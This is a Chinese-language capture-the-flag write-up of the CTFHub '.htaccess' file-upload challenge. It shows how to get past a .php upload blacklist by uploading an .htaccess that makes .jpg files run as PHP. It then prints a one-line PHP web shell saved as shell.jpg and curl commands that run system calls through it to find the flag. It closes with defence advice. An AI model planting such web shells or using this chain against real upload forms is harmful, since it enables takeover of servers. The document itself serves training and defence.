---
title: CTFHub 文件上传-.htaccess
date: 2026-10-21
categories: CTFhub Web 文件上传 htaccess
tags: CTFhub Web 文件上传 htaccess
---

# 题目：CTFHub 文件上传-.htaccess

## 题目描述
打开题目页面，界面与之前的题一样。
直接上传 `shell.php`，发现无法上传（后端黑名单拦截了 `.php` 后缀）。
**分析：**
服务器使用了黑名单，禁止上传 `.php`。但如果没有禁用 `.htaccess` 文件，就可以利用它来重写 Apache 的解析规则。

## 解题思路

### 漏洞原理
`.htaccess` 是 Apache 服务器的一个配置文件，用于目录级别的配置。
如果在允许上传的目录中上传 `.htaccess`，并在其中写入：
```apache
AddType application/x-httpd-php .jpg
```
那么该目录下所有 .jpg 文件都会被服务器当作 PHP 脚本来执行。

### 攻击链
上传 .htaccess，设置 .jpg 为 PHP 解析。
上传代码为 PHP 的 shell.jpg。
访问 shell.jpg，成功执行命令

## 解题步骤
1. 制作并上传 .htaccess
为了防止 Windows 隐藏扩展名导致文件变成 .htaccess.txt，请用记事本“另存为”，文件名写 .htaccess，保存类型选“所有文件”。
内容如下：
```apache
AddType application/x-httpd-php .jpg
```
在网页上上传该文件，确认上传成功。

2. 制作并上传图片马
新建 shell.jpg，写入：
```php
<?php @eval($_POST['cmd']); ?>
```
(这题不需要 GIF89a，因为解析规则已改)
在网页上上传 shell.jpg。上传成功，返回路径 upload/shell.jpg。

3. 连马并获取 Flag
在 CMD 中执行：
```cmd
curl -X POST http://challenge-xxx.sandbox.ctfhub.com:10800/upload/shell.jpg -d "cmd=system('ls');"
```
发现成功执行，随后执行 find 命令：
```cmd
curl -X POST http://challenge-xxx.sandbox.ctfhub.com:10800/upload/shell.jpg -d "cmd=system('find / -name flag* 2>/dev/null');"
```
找到 /var/www/html/flag_xxx.php，cat 读取即可。

## 知识点总结
1. 

| 知识点 | 说明 |
| :--- | :--- |
| `.htaccess` | Apache 目录配置文件，可重写解析规则 |
| 黑名单绕过 | 通过其他后缀（jpg）配合解析规则执行 PHP |
| AddType | 将指定后缀文件当作某种类型解析 |

2. 防御建议
   1. 禁用 .htaccess 上传：在后端黑名单中明确加入 .htaccess。

   2. 重命名上传文件：强制修改后缀，防止覆盖配置文件。

   3. 服务器配置：在全局 Apache 配置中关闭 AllowOverride，禁止用户覆盖。

